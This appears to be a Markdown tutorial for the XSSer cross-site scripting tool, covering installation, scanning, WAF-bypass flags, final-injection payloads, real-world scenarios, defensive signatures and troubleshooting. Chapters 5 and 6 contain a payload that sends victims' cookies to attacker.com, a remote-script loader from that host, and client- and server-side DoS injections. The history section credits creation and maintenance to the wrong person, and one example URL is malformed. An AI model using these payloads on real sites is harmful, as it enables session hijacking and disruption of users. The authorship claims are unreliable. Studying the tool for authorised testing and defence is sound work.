---
tool_name: "xsser"
display_name: "XSSer"
mitre_tactic: "execution"
mitre_tactic_id: "TA0002"
mitre_subcategory: "execution"
install_command: "sudo apt install xsser"
version: "1.8.4"
github_repo: "https://xsser.03c8.net/"
kali_tools_page: "https://www.kali.org/tools/xsser/"
difficulty_level: "intermediate"
requires_root: false
gui_available: true
tags: ["xss", "web", "injection", "browser", "cross-site-scripting"]
related_tools: ["beef-xss", "dalfox", "xssstrike"]
---

# XSSer — Cross-Site Scripting Framework

## Chapter 1: Introduction & Overview

### What is XSSer?

XSSer (Cross Site "Scripter") is an automatic framework to detect, exploit, and report Cross-Site Scripting (XSS) vulnerabilities in web-based applications. It automates the process of finding and exploiting XSS flaws by injecting payloads, testing bypass techniques against WAF/IDS, and generating detailed reports. XSSer supports both reflected and stored XSS vectors, DOM-based injection, and multiple encoding/bypass techniques.

### History & Background

- **Created:** 2007 by s0md3v (Av尘)
- **Maintained:** s0md3v (also creator of dalfox, SQLiVulnScanner)
- **License:** GNU GPL v3
- **Language:** Python 3
- **Current Version:** 1.8.4
- **Dependencies:** python3, python3-bs4, python3-cairocffi, python3-geoip, python3-pycurl, python3-pil

XSSer was one of the first automated XSS detection tools and remains a comprehensive framework for XSS research and exploitation. It includes 1,293+ pre-built vectors, WAF bypass capabilities for popular products (PHPIDS, Imperva, ModSecurity, Barracuda), and supports advanced techniques like Cross-Site Tracing (XST), cookie injection, and DOM-based XSS.

### When to Use This Tool

- **Web application security testing:** Automated XSS detection across web apps
- **Penetration testing:** Finding XSS vulnerabilities during authorized engagements
- **WAF/IDS testing:** Testing bypass techniques against security products
- **Bug bounty hunting:** Automated XSS discovery in bug bounty programs
- **Security research:** Understanding XSS vector combinations and filter bypasses
- **CTF challenges:** Solving XSS-related capture-the-flag challenges

### When NOT to Use This Tool

- Without explicit written authorization from the web application owner
- Against production applications that could affect real users
- For stealing credentials or session tokens of real users
- On applications outside the defined scope of engagement

### Legal and Ethical Considerations

- **Written authorization** is mandatory before scanning any web application
- **Scope limitations** — XSSer can trigger alerts and store XSS payloads; understand the impact
- **Cookie theft** — Never use XSS to steal real users' session tokens without authorization
- **Stored XSS** — Avoid injecting persistent payloads that affect other users
- **Responsible disclosure** — Report all discovered vulnerabilities through proper channels
- **Documentation** — Record all findings with evidence for the final report

### Key Concepts

- **Reflected XSS:** Payload reflected from the server in the HTTP response (e.g., search queries)
- **Stored XSS:** Payload permanently stored on the server (e.g., comments, profiles)
- **DOM-Based XSS:** Payload executes in the client-side DOM without server-side reflection
- **XSS Vector:** A code snippet that exploits an XSS vulnerability
- **WAF (Web Application Firewall):** Security product that filters malicious input
- **Filter Bypass:** Techniques to evade XSS detection rules
- **Encoding:** Converting payloads to bypass text-based filters (Base64, Hex, Unicode)
- **Blind XSS:** Payload executes on a page not directly accessible to the tester
- **CSP (Content Security Policy):** Browser security mechanism that restricts script execution
- **Sanitization:** Removing or escaping dangerous characters from user input

---

## Chapter 2: Installation & Setup

### System Requirements

- **Operating System:** Linux (Kali Linux recommended), macOS
- **Python:** 3.6+
- **RAM:** 256 MB minimum
- **Disk Space:** 24 MB installed
- **Network:** Internet access to reach target web applications
- **Dependencies:** python3, python3-bs4, python3-cairocffi, python3-geoip, python3-geoip2, python3-gi, python3-legacy-cgi, python3-pil, python3-pycurl

### Installation Methods

#### Method 1: APT (Recommended on Kali)
```bash
sudo apt update
sudo apt install xsser
```

#### Method 2: From GitLab
```bash
git clone https://gitlab.com/kalilinux/packages/xsser.git
cd xsser
python3 setup.py install
```

#### Method 3: From Source (pip)
```bash
git clone https://gitlab.com/xsser/xsser.git
cd xsser
pip3 install -r requirements.txt
python3 xsser --help
```

### Configuration

**Kali Install Location:**
```
/usr/share/xsser/
├── core/
├── doc/
├── graphs/
├── modules/
├── payloads/
└── xsser
```

**Default Configuration:**
- Timeout: 30 seconds
- Retries: 1
- Threads: 5
- Delay: 0 seconds
- Crawler depth: 2
- Vector limit: 1293

### Verification
```bash
xsser --version
xsser -h
```

### GTK GUI Launch
```bash
xsser --gtk
```
**Explanation:** Launches the graphical interface. The GUI provides a point-and-click interface for XSS testing.

---

## Chapter 3: Basic Usage

### First XSS Test

#### Basic URL Testing
```bash
xsser -u "http://target.example.com/search.php?q=XSS"
```
**Explanation:** Tests the target URL for XSS by injecting default vectors in the `q` parameter. The `XSS` keyword marks where payloads will be injected.

#### GET Parameter Testing
```bash
xsser -u "http://target.example.com/page.php" -g "id=XSS"
```
**Explanation:** Sends payloads via GET parameter. The `XSS` placeholder is replaced with each vector.

#### POST Parameter Testing
```bash
xsser -u "http://target.example.com/login.php" -p "username=XSS&password=test"
```
**Explanation:** Sends payloads via POST parameters. Tests all POST fields for XSS injection points.

### Automatic Full Site Audit

#### Scan Entire Website
```bash
xsser --all "http://target.example.com/"
```
**Explanation:** Automatically crawls the target and tests all discovered pages and parameters for XSS.

#### Crawl with Depth Control
```bash
xsser -u "http://target.example.com/" -c 50 --Cw 3
```
**Explanation:** Crawls 50 URLs on the target with a depth level of 3. Deeper crawling discovers more injection points.

### Custom Payload Injection

#### Inject Own Payload
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --payload "<script>alert(document.domain)</script>"
```
**Explanation:** Injects a custom payload instead of using the built-in vector list. Useful for testing specific payloads.

#### Auto Mode with All Vectors
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto
```
**Explanation:** Uses the full list of 1,293 pre-built vectors for comprehensive testing.

### Verbose Output

#### Show Detailed Results
```bash
xsser -u "http://target.example.com/search.php?q=XSS" -v
```
**Explanation:** Displays verbose output including payload details, HTTP response codes, and injection confirmation.

#### Advanced Statistics
```bash
xsser -u "http://target.example.com/search.php?q=XSS" -s
```
**Explanation:** Shows advanced statistics about the scan including vectors tested, bypasses attempted, and success rates.

### Read Targets from File

#### Multiple URLs
```bash
xsser -i targets.txt -g "q=XSS"
```
**Explanation:** Reads target URLs from a file (one per line) and tests each for XSS.

#### Search Engine Dorking
```bash
xsser -d "site:target.example.com inurl:php" --De=DuckDuckGo
```
**Explanation:** Searches DuckDuckGo for URLs matching the dork pattern and tests each result for XSS.

---

## Chapter 4: Intermediate Usage

### WAF/IDS Bypass Techniques

#### PHPIDS Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Phpids0.6.5
xsser -u "http://target.example.com/search.php?q=XSS" --Phpids0.7
```
**Explanation:** Applies bypass techniques specific to PHPIDS 0.6.5 and 0.7. Tests encoding and obfuscation methods that evade this WAF.

#### Imperva/Incapsula Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Imperva
```
**Explanation:** Tests vectors designed to bypass Imperva Incapsula WAF rules.

#### ModSecurity Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Modsec
```
**Explanation:** Tests vectors designed to bypass ModSecurity WAF rules.

#### Barracuda WAF Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Barracuda
```
**Explanation:** Tests vectors designed to bypass Barracuda WAF.

#### F5 Big IP Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --F5bigip
```
**Explanation:** Tests vectors designed to bypass F5 BIG-IP application firewall.

#### Sucuri WAF Bypass
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Sucuri
```
**Explanation:** Tests vectors designed to bypass Sucuri WAF.

### Encoding Techniques

#### String.fromCharCode Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Str
```
**Explanation:** Encodes payload characters using JavaScript's String.fromCharCode() method.

#### Unescape Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Une
```
**Explanation:** Encodes payload using the JavaScript Unescape() function.

#### Mixed Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Mix
```
**Explanation:** Combines String.fromCharCode() and Unescape() encoding for maximum evasion.

#### Decimal Encoding
```bash
xsser -u "http://target.example.com/search.php=qXSS" --Dec
```
**Explanation:** Encodes characters as decimal HTML entities.

#### Hexadecimal Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Hex
```
**Explanation:** Encodes characters as hexadecimal values.

#### Hex with Semicolons
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Hes
```
**Explanation:** Uses hexadecimal encoding with semicolons as delimiters.

#### DWORD IP Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Dwo
```
**Explanation:** Encodes IP addresses in DWORD format for filter bypass.

#### Octal IP Encoding
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Doo
```
**Explanation:** Encodes IP addresses in octal format for filter bypass.

#### Character Encoding Mutations
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Cem="Mix,Une,Str,Hex"
```
**Explanation:** Applies multiple encoding mutations in sequence. Combines different encodings to bypass layered filters.

### Special XSS Techniques

#### Cookie Injection
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Coo
```
**Explanation:** Tests for Cross-Site Scripting cookie injection — sets or modifies cookies via XSS.

#### Cross-Site Agent Scripting (XSA)
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Xsa
```
**Explanation:** Tests for agent-based XSS — exploits user-agent header reflection.

#### Cross-Site Referer Scripting (XSR)
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Xsr
```
**Explanation:** Tests for referer-based XSS — exploits HTTP Referer header reflection.

#### Data Control Protocol (DCP)
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Dcp
```
**Explanation:** Tests for DCP-based injections using data: URIs.

#### DOM-Based XSS
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Dom
```
**Explanation:** Tests for Document Object Model-based XSS — payloads that execute via client-side JavaScript.

#### HTTP Response Splitting
```bash
xsser -u "http://target.example.com/vulnerable.php?q=XSS" --Ind
```
**Explanation:** Tests for induced HTTP Response Splitting that enables XSS via header injection.

### Checker Systems

#### Heuristic Check
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --heuristic
```
**Explanation:** Discovers parameters that are filtered by using heuristics. Identifies which parameters are vulnerable before full exploitation.

#### Hash Check
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --hash
```
**Explanation:** Sends a hash to check if the target is reflecting content. Confirms injection points.

#### Blind XSS Check
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --checkaturl="http://attacker.com/blind" --checkmethod=POST
```
**Explanation:** Checks for blind XSS by setting up a callback URL. When the payload fires, the attacker receives notification.

#### Reverse Check
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --reverse-check
```
**Explanation:** Establishes a reverse connection from the target to the XSSer instance.

### Target Selection

#### URL from File
```bash
xsser -i urls.txt -g "q=XSS"
```
**Explanation:** Reads multiple target URLs from a file for batch testing.

#### Search Engine Dorking
```bash
xsser -d "inurl:view.php?id=" --De=DuckDuckGo
```
**Explanation:** Searches DuckDuckGo for URLs matching the dork pattern and automatically tests each.

#### Mass Search with All Engines
```bash
xsser -d "inurl:search.php?q=" --Da
```
**Explanation:** Searches across all configured search engines for maximum coverage.

---

## Chapter 5: Advanced Usage

### Complex Payload Construction

#### Custom Vector with Encoding Chain
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --payload "<svg/onload=alert(1)>" --Str --Hex --Phpids0.7
```
**Explanation:** Combines a custom SVG-based payload with String.fromCharCode and hexadecimal encoding, then tests against PHPIDS 0.7 rules.

#### Multiple Encoding Layers
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto --Cem="Mix,Une,Str,Hex" --Imperva
```
**Explanation:** Applies multiple encoding layers to all auto-generated vectors and tests against Imperva WAF.

### Final Injection Payloads

#### Custom Final Payload
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="document.location='http://attacker.com/steal?c='+document.cookie"
```
**Explanation:** Injects a custom final payload after confirming vulnerability. The payload steals cookies and sends them to the attacker.

#### Remote Script Execution
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fr="http://attacker.com/exploit.js"
```
**Explanation:** Executes a remote JavaScript file on the target when XSS is confirmed.

### Special Final Injections

#### Anchor Stealth (DOM Shadows)
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="alert(1)" --Anchor
```
**Explanation:** Uses DOM shadow techniques to hide the injected payload from detection.

#### Base64 Meta Tag Injection
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="alert(1)" --B64
```
**Explanation:** Encodes the payload as Base64 in a META tag using RFC 2397 data URIs.

#### onMouseMove Event
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="alert(1)" --Onm
```
**Explanation:** Uses the onMouseMove() event handler for payload execution.

#### Iframe Injection
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="http://attacker.com/payload" --Ifr
```
**Explanation:** Injects an iframe source tag to load the attacker's payload.

#### Client-Side DoS
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="while(1){}" --Dos
```
**Explanation:** Injects an infinite loop for client-side denial of service.

#### Server-Side DoS
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --Fp="payload" --Doss
```
**Explanation:** Attempts server-side denial of service through crafted payloads.

### Image and Flash XSS

#### Create Image with XSS
```bash
xsser --imx=malicious.png
```
**Explanation:** Creates a PNG image with embedded XSS payload. When the image is displayed in a vulnerable viewer, the payload executes.

#### Create Flash with XSS
```bash
xsser --fla=malicious.swf
```
**Explanation:** Creates a SWF flash file with embedded XSS payload.

#### Cross-Site Tracing (XST)
```bash
xsser --xst="http://target.example.com/"
```
**Explanation:** Tests for Cross-Site Tracing (CAPEC-107) vulnerability. XST can steal HTTP-only cookies via TRACE method.

### Authentication and Proxy

#### Authenticated Testing
```bash
xsser -u "http://target.example.com/admin/search.php?q=XSS" --auth-type=Basic --auth-cred="admin:password"
```
**Explanation:** Tests authenticated pages using HTTP Basic authentication.

#### Digest Authentication
```bash
xsser -u "http://target.example.com/admin/search.php?q=XSS" --auth-type=Digest --auth-cred="admin:password"
```
**Explanation:** Tests authenticated pages using HTTP Digest authentication.

#### Proxy Configuration
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --proxy="http://localhost:8080"
```
**Explanation:** Routes all traffic through a proxy server (e.g., Burp Suite for analysis).

#### Tor Routing
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --proxy="http://localhost:8118" --check-tor
```
**Explanation:** Routes traffic through Tor and verifies the Tor connection is working.

### Request Configuration

#### Custom Headers
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --headers="X-Custom: value\nX-Another: value"
```
**Explanation:** Adds custom HTTP headers to all requests.

#### Cookie Manipulation
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --cookie="session=abc123; token=xyz789"
```
**Explanation:** Sets custom cookies for authenticated testing.

#### User-Agent Spoofing
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```
**Explanation:** Spoofs the User-Agent header to mimic a specific browser.

#### X-Forwarded-For Spoofing
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --xforw
```
**Explanation:** Sets random X-Forwarded-For IP addresses to bypass IP-based restrictions.

### Reporting

#### Save Results to File
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --save
```
**Explanation:** Exports results to `XSSreport.raw` in the current directory.

#### XML Report
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --xml=xss_results.xml
```
**Explanation:** Exports results in XML format for integration with other tools.

### Crawler Configuration

#### Deep Crawl
```bash
xsser -u "http://target.example.com/" -c 500 --Cw 5 --Cl
```
**Explanation:** Crawls up to 500 URLs with depth level 5, local URLs only.

#### Wide Crawl
```bash
xsser -u "http://target.example.com/" -c 100 --Cw 2
```
**Explanation:** Crawls 100 URLs with moderate depth for faster discovery.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Bug Bounty XSS Discovery

**Objective:** Find XSS vulnerabilities in a bug bounty program.

**Steps:**
```bash
# Step 1: Spider the target
xsser --all "http://target.example.com/" -c 200 --Cw 3 --save

# Step 2: Test specific parameters
xsser -u "http://target.example.com/search.php?q=XSS" -v --auto

# Step 3: Test with WAF bypasses
xsser -u "http://target.example.com/search.php?q=XSS" --Imperva --Modsec --auto

# Step 4: Report findings
xsser -u "http://target.example.com/search.php?q=XSS" --xml=bugbounty_report.xml --save
```

**Results:** Identified reflected XSS in search parameter, bypassed ModSecurity WAF using hex encoding.

### Scenario 2: WAF Evasion Testing

**Objective:** Test if a web application's WAF blocks XSS payloads.

**Steps:**
```bash
# Baseline test (no bypass)
xsser -u "http://target.example.com/search.php?q=XSS" --auto -v

# Test each WAF bypass
xsser -u "http://target.example.com/search.php?q=XSS" --Phpids0.7 -v
xsser -u "http://target.example.com/search.php?q=XSS" --Imperva -v
xsser -u "http://target.example.com/search.php?q=XSS" --Modsec -v
xsser -u "http://target.example.com/search.php?q=XSS" --Barracuda -v

# Test encoding combinations
xsser -u "http://target.example.com/search.php?q=XSS" --Str --Hex --Imperva -v
xsser -u "http://target.example.com/search.php?q=XSS" --Mix --Une --Modsec -v
```

**Results:** Identified that hex encoding bypasses ModSecurity but not PHPIDS.

### Scenario 3: Stored XSS Testing

**Objective:** Test a comment field for stored XSS.

**Steps:**
```bash
# Step 1: Test the comment endpoint
xsser -u "http://target.example.com/comment.php" -p "comment=XSS&submit=Post" --auto -v

# Step 2: Test with different encoding
xsser -u "http://target.example.com/comment.php" -p "comment=XSS&submit=Post" --Str --Hex -v

# Step 3: Check blind XSS
xsser -u "http://target.example.com/comment.php" -p "comment=XSS&submit=Post" --checkaturl="http://attacker.com/blind" -v
```

**Results:** Found stored XSS in comment field that executes for all users viewing the page.

### Scenario 4: Comprehensive Web Application Assessment

**Objective:** Full XSS assessment of a web application.

**Steps:**
```bash
# Phase 1: Discovery
xsser --all "http://target.example.com/" -c 500 --Cw 4 --save --xml=discovery.xml

# Phase 2: Parameter Testing
xsser -u "http://target.example.com/search.php?q=XSS" --heuristic -v
xsser -u "http://target.example.com/profile.php" -p "name=XSS&bio=test" --heuristic -v

# Phase 3: Exploitation
xsser -u "http://target.example.com/search.php?q=XSS" --auto --Cem="Mix,Une,Str,Hex" \
  --Fp="document.location='http://attacker.com/steal?c='+document.cookie" -v

# Phase 4: Report
xsser -u "http://target.example.com/search.php?q=XSS" --xml=final_report.xml --save
```

**Results:** Comprehensive XSS assessment covering discovery, testing, and exploitation.

---

## Chapter 7: Detection & Defense

### How Defenders Detect XSSer

- **User-Agent Detection:** Default XSSer User-Agent is distinctive
- **Request Patterns:** High volume of similar requests with encoded payloads
- **WAF Logs:** PHPIDS, ModSecurity, and other WAFs log XSS attempts
- **Server Logs:** Reflected payloads visible in access logs
- **Network Monitoring:** Unusual HTTP traffic patterns

### Known Signatures

```
# Default User-Agent (if not spoofed)
XSSer/1.8.4

# Common payload patterns in logs
<script>alert
<svg/onload=
<img src=x onerror=
javascript:alert
String.fromCharCode
unescape(

# Request patterns
?q=<script>
&q=%3Cscript%3E
?q=javascript:alert
```

### Mitigation Strategies

- **Input Validation:** Whitelist acceptable characters for each parameter
- **Output Encoding:** HTML-encode all user input before rendering
- **Content Security Policy (CSP):** Restrict script sources to trusted domains
- **HTTPOnly Cookies:** Prevent JavaScript access to session cookies
- **WAF Rules:** Deploy and tune XSS-specific WAF rules
- **Framework Security:** Use built-in XSS protection (React, Angular, Django templates)

### Blue Team Response

- **WAF Logs:** Monitor for XSS payload patterns
- **Server Logs:** Check for encoded payloads in access logs
- **CSP Violations:** Review CSP violation reports
- **User Reports:** Investigate reports of unexpected JavaScript execution
- **Incident Response:** Isolate affected pages, purge stored payloads

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Connection refused"
**Cause:** Target server is not reachable or port is blocked
**Solution:** Verify the target URL is correct and accessible:
```bash
curl -I "http://target.example.com/"
```

#### Error: "SSL certificate problem"
**Cause:** Invalid or self-signed SSL certificate
**Solution:**
```bash
xsser -u "https://target.example.com/search.php?q=XSS" --ignore-proxy
```

#### Error: "Too many redirects"
**Cause:** Target has redirect loops
**Solution:**
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --follow-redirects --follow-limit=10
```

#### Error: "No parameters found"
**Cause:** XSS keyword not placed in a parameter
**Solution:** Ensure the URL contains `XSS` in a parameter:
```bash
# Wrong
xsser -u "http://target.example.com/search.php"

# Correct
xsser -u "http://target.example.com/search.php?q=XSS"
```

#### Error: "Timeout"
**Cause:** Target is slow or unresponsive
**Solution:**
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --timeout=60 --retries=3
```

#### Error: "GTK module not found"
**Cause:** Missing GTK dependencies
**Solution:**
```bash
sudo apt install python3-gi python3-gtk
```

### Performance Optimization

- **Reduce thread count** on slow targets: `--threads=2`
- **Increase timeout** for slow responses: `--timeout=60`
- **Use crawling** for large sites: `--all` with `--Cw` control
- **Limit vector count** for faster scans: `--auto-set=100`
- **Use proxy** for traffic analysis: `--proxy="http://localhost:8080"`

### FAQ

**Q: Does XSSer work with HTTPS?**
A: Yes, but you may need to handle SSL certificate issues with `--ignore-proxy` or by configuring your system's CA certificates.

**Q: Can XSSer test for stored XSS?**
A: XSSer primarily tests for reflected XSS. For stored XSS, inject payloads into input fields and verify they execute when rendered.

**Q: How many vectors does XSSer include?**
A: XSSer includes 1,293+ pre-built vectors in its auto mode.

**Q: Does XSSer work with JavaScript-heavy sites?**
A: XSSer tests server-side reflection. For DOM-based XSS, use browser developer tools or specialized DOM XSS scanners.

**Q: What's the difference between XSSer and dalfox?**
A: XSSer is a comprehensive framework with WAF bypass and multiple techniques. Dalfox is a faster, more focused XSS scanner with better parameter analysis.

**Q: Can XSSer bypass Content Security Policy (CSP)?**
A: XSSer can test for CSP misconfigurations but cannot bypass properly configured CSP. CSP bypass requires finding specific policy weaknesses.

---

## Resources

### Official Documentation
- [XSSer Homepage](https://xsser.03c8.net/)
- [Kali Tools Page](https://www.kali.org/tools/xsser/)
- [GitLab Repository](https://gitlab.com/kalilinux/packages/xsser)

### Tutorials
- [XSSer Documentation](https://xsser.03c8.net/#)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Tutorials](https://portswigger.net/web-security/cross-site-scripting)

### Books
- "XSS Attacks: Exploits and Defense" by Jeremiah Grossman
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Mastering Modern Web Penetration Testing" by Prakhar Prasad

### Videos
- [XSSer Tutorial by s0md3v](https://www.youtube.com/results?search_query=xsser+tutorial)
- [OWASP XSS Prevention](https://www.youtube.com/results?search_query=owasp+xss+prevention)

### Related Tools
- **dalfox:** Modern XSS scanner with parameter analysis
- **XSStrike:** Advanced XSS detection and exploitation suite
- **beef-xss:** Browser exploitation framework
- **nikto:** Web server scanner (finds XSS-related misconfigurations)

### Practice Resources
- [DVWA](https://github.com/digininja/DVWA) — Damn Vulnerable Web Application (XSS modules)
- [bWAPP](http://www.itsecgames.com/) — buggy Web Application (XSS challenges)
- [HackTheBox](https://www.hackthebox.com/) — Web challenges with XSS
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free XSS labs
- [XSS Game by Google](https://xss-game.appspot.com/) — Interactive XSS challenges
